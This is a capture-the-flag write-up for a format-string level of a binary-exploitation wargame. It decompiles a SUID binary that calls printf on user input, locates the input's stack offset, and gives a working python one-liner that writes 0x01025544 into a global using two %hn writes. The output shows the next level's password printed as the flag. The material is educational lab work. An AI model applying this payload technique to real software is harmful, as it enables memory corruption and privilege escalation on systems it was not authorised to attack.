# Level 4

Same recon as level0: SUID **level5**.

## Analysis

```c
int m;

void p(char *s) { printf(s); }       // format string vulnerability

void n(void) {
    char local_20c[520];
    fgets(local_20c, 0x200, stdin);
    p(local_20c);
    if (m == 0x1025544)              // target value
        system("/bin/cat /home/user/level5/.pass");
}
void main(void) { n(); }
```

Same format-string write as level3, two differences:

1. The target value is `0x01025544` (16,930,116), not `0x40`.
2. On success `system` cats the flag directly, so no shell and no `; cat` needed.

`m`'s address from the disassembly of `n`:

```asm
mov    0x8049810,%eax           ; load m
cmp    $0x1025544,%eax          ; compare with target
```

So `m` is at `0x08049810`.

## Exploit

### Where our input lands

```
$ ./level4
AAAA %x %x %x %x %x %x %x %x %x %x %x %x
AAAA b7ff26b0 bffffcb4 b7fd0ff4 0 0 bffffc78 804848d bffffa70 200 b7fd1ac0 b7ff37d0 41414141
```

`41414141` is the 12th word, so our input is at **position 12** (the extra `p()` frame shifts it down from position 4 in level3).

### Why %hn

Printing 16,930,116 bytes for a single `%n` is impractical. Split the value into two 16-bit halves and write each with [`%hn`](../knowledge_base/format_string.md#writing-large-values-hn-half-word) (writes the low 16 bits of the count):

| Half | Value | Decimal | Target |
|---|---|---|---|
| high | `0x0102` | 258 | `m+2` = `0x08049812` |
| low | `0x5544` | 21828 | `m` = `0x08049810` |

The printed byte count only grows, so write the smaller half (258) first.

### Layout and padding

Place both target addresses first (positions 12 and 13), then pad up to each count:

```
[ &m+2 ][ &m ]      8 bytes printed
%250x   -> 258      %12$hn writes 0x0102 to m+2   (250 = 258 - 8)
%21570x -> 21828    %13$hn writes 0x5544 to m     (21570 = 21828 - 258)
```

### Run

```bash
python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08" + "%250x%12$hn" + "%21570x%13$hn"' | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

(`\x12\x98\x04\x08` = `m+2`, `\x10\x98\x04\x08` = `m`, both little-endian. Single quotes keep `$` literal so `%12$hn` is not shell-expanded.)

Flag: `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
